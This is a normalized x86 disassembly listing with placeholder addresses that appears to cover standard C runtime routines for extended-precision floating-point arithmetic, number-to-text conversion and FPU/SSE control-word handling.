mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_4403ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push edx
xor edx edx
push edx
push edx
push edx
push [ ebp + 0x14 ]
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43fcd2
mov edi eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_43f616
add esp 0x28
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
or edi 0x2
sub_440409
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
lea esi [ ecx + edx ]
xor ebx ebx
cmp esi ecx
jb r-xdata
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ edi + 0x4 ]
lea esi [ ecx + edx ]
xor ebx ebx
cmp esi ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ecx + 0x1 ]
xor esi esi
cmp edx ecx
jb r-xdata
mov [ eax ] esi
test ebx ebx
je r-xdata
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov ecx [ edi + 0x8 ]
add [ eax + 0x8 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_44047a
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_440d72
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
xor esi esi
cmp [ ebp + 0x8 ] 0x9001f
jne r-xdata
and eax 0xfff7ffff
push eax
push [ ebp + 0x8 ]
push esi
call sub_438b0f
add esp 0xc
test eax eax
je r-xdata
cmp eax 0xffffffff
jne r-xdata
pop esi
leave
retn
push esi
push esi
push esi
push esi
push esi
call sub_4296a0
fwait
fnstcw [ ebp - 0x4 ]
movzx ecx [ ebp - 0x4 ]
and ecx 0x1f3d
mov edx 0x23d
cmp cx dx
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
and ecx 0xfec0
cmp ecx 0x1e80
je r-xdata
sub_440de5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
push ebx
movzx edx cx
push esi
mov ecx edx
mov esi 0xc00
and ecx esi
push edi
mov edi 0x300
mov ebx 0x200
je r-xdata
or eax 0x80000
and edx edi
je r-xdata
cmp ecx 0x400
je r-xdata
or eax 0x20000
cmp edx ebx
jne r-xdata
or eax 0x100
cmp ecx 0x800
je r-xdata
pop ebp
retn
or eax 0x40000
test [ ebp + 0x8 ] 0x1000
pop edi
pop esi
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebx
jmp r-xdata
cmp ecx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_440e84
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_440f12
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_440f55
xor eax eax
test dl dl
jns r-xdata
push ebx
mov ebx 0x200
push esi
push edi
test ebx edx
je r-xdata
push 0x10
pop eax
test edx 0x400
je r-xdata
or eax 0x8
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov edi 0x100
test edi edx
je r-xdata
or eax 0x1
mov ecx edx
mov esi 0x6000
and ecx esi
je r-xdata
or eax 0x80000
pop edi
and edx 0x8040
sub edx 0x40
pop esi
pop ebx
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax edi
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
retn
sub edx 0x40
jne r-xdata
or eax ebx
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x1000000
retn
or eax 0x300
